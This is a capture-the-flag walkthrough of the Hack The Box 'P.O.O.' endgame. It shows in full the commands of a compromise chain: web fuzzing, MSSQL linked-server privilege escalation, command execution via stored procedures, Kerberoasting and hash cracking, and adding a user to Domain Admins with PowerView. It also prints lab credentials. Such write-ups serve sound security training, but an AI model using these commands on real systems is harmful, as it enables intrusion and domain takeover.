# [P.O.O.](https://app.hackthebox.com/endgames/poo)

```bash
nmap -p- --min-rate 5000 10.13.38.11 -Pn
```

![alt text](img/image.png)


After finding open ports, let's do greater nmap scan for these ports.

```bash
nmap -A -sC -sV -p80,1433 10.13.38.11 -Pn
```

![alt text](img/image-1.png)


Let's do `Directory Fuzzing` for port `80`.

```bash
gobuster dir -u http://10.13.38.11 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt  -t 50
```

![alt text](img/image-16.png)


We find `.ds_store` file located here. This files are actually created by MacOS when it visits a directory. They store attributes of the folder and the files within it. Likely here the site was developed on a Mac and then deployed to this Windows server. The structure of the .ds_store file is proprietary, but it has been reversed.


[DS_walk](https://github.com/Keramas/DS_Walk) tool is used to enumerate `.ds_store` files. Let's use this.

```bash
python3 ds_walk.py -u http://10.13.38.11
```

![alt text](img/image-2.png)

I know that target application is `Windows IIS` Server. Let's fuzz files on target webserver by looking at this [blog](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

Due to this paper, we need to use [iis_shortname_scanner](https://github.com/lijiejie/IIS_shortname_Scanner) tool to enumerate.

```bash
python3 iis_shortname_scan.py http://10.13.38.11/
```

![alt text](img/image-3.png)


Let's enumerate `db` directories also which we found from `ds_walk` tool's output.
```bash
python3 iis_shortname_scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
```

![alt text](img/image-4.png)


We found, let's `grep` words from seclists that starts with `co` 
```bash
grep "^co" /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt > co_fuzzer.txt 
```

After this, let's do `Directory Fuzzing` with prepared wordlist.

```bash
wfuzz -c -w co_fuzzer.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404
```

![alt text](img/image-5.png)



Let's read content of `connection` file, maybe contains some sensiitve information.

```bash
curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
```

![alt text](img/image-6.png)


external_user: #p00Public3xt3rnalUs3r#


We also find first flag.

As we know port `1433` is open, we can connect into `MSSQL` via Impacket's script called `mssqlclient.py`

```bash
impacket-mssqlclient external_user:'#p00Public3xt3rnalUs3r#'@10.13.38.11
```

![alt text](img/image-7.png)


I used this [cheatsheet](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) to enumerate `MSSQL`.


While I want to run `enable_xp_cmdshell`, it doesn't allow due to low-level permissions.


I looked at permissions as below.
```bash
EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [COMPATIBILITY\POO_CONFIG]

EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```

![alt text](img/image-8.png)


From permissions above, I see that I can add user with `sysadmin` privileges. As a result, I can do `Command Execution`.

```bash
EXECUTE('EXECUTE(''CREATE LOGIN dr4ks WITH PASSWORD = ''''qwe123QWE!@#'''';'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]

EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''dr4ks'''', ''''sysadmin'''''') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
```


Let's connect into `MSSQL` via our new user called `dr4ks`.

```bash
impacket-mssqlclient dr4ks:'qwe123QWE!@#'@10.13.38.11
```

Now, I can read flag from `flag` table.
```bash
select * from flag.dbo.flag;
```

![alt text](img/image-9.png)


Also, I can run system commands as below.

![alt text](img/image-10.png)


While I want to read `web.config` file, it doesn't allow.

![alt text](img/image-11.png)


I find another method from [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#rce-read-files-executing-scripts-python-and-r)

```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
```

![alt text](img/image-12.png)


This `stored procedure` worked, let's try to read `web.config` file.
```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("type \inetpub\wwwroot\web.config"))'
```

![alt text](img/image-13.png)


Administrator: EverybodyWantsToWorkAtP.O.O.


From `Directory Fuzzing` result, I see `admin` endpoint, let's try to access here via this creds to read something.


```bash
curl -s http://administrator:EverybodyWantsToWorkAtP.O.O.@10.13.38.11/admin/
```

![alt text](img/image-14.png)


While I run `ipconfig` on target machine, I see that one interface that doesn't have `IPv4` address and has `IPv6` address.

```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("ipconfig"))'
```

![alt text](img/image-15.png)


Ipv6: 'dead:beef::1001'


While I want to `nmap` scan for this `IPv6` , I find `wsman` port. We use `-6` means `IPv6` address.
```bash
nmap -p- -6 --min-rate 10000 dead:beef::1001
```

![alt text](img/image-17.png)

To connect into machine, I need to add `hostname` into `/etc/hosts` file for resolving purposes to `IPv6` address.

```bash
dead:beef::1001 compatibility
```


Now, we can connect with `evil-winrm` by using `administrator` credentials.

```bash
evil-winrm -i compatibility -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'
```

flag.txt

![alt text](img/image-18.png)


I find `DC`'s ip address by doing `nslookup`.

![alt text](img/image-19.png)


But I cannot run any of scripts. I think to login into `MSSQL` for command execution. For this, I must setup `-windows-auth` option.
```bash
impacket-mssqlclient administrator:'EverybodyWantsToWorkAtP.O.O.'@10.13.38.11 -windows-auth
xp_cmdshell powershell -c import-module c:\programdata\invoke-kerberoast.ps1; invoke-kerberoast -outputformat hashcat
```

![alt text](img/image-20.png)

I get hash of `p00_adm` user and tries to crack with `hashcat`.

```bash
hashcat -m 13100 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

![alt text](img/image-21.png)


p00_adm: ZQ!5t4r


From `Bloodhound` result, we see that this user has `GenericAll` privilege to `DC`

![alt text](img/image-22.png)

So let's add our this into `Domain Admins` to access into `Domain Controller`. For this, I will use `PowerView`.

```bash
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
```


After this, we can access to `SMB` share of `Domain Controller`.

```bash
net use \\DC.intranet.poo\c$ /u:intranet.poo\p00_adm 'ZQ!5t4r' # access is created
dir \\DC.intranet.poo\c$\users\   # for checking
```


Let's read final flag.
```bash
type \\DC.intranet.poo\C$\Users\mr3ks\Desktop\flag.txt
```

![alt text](img/image-23.png)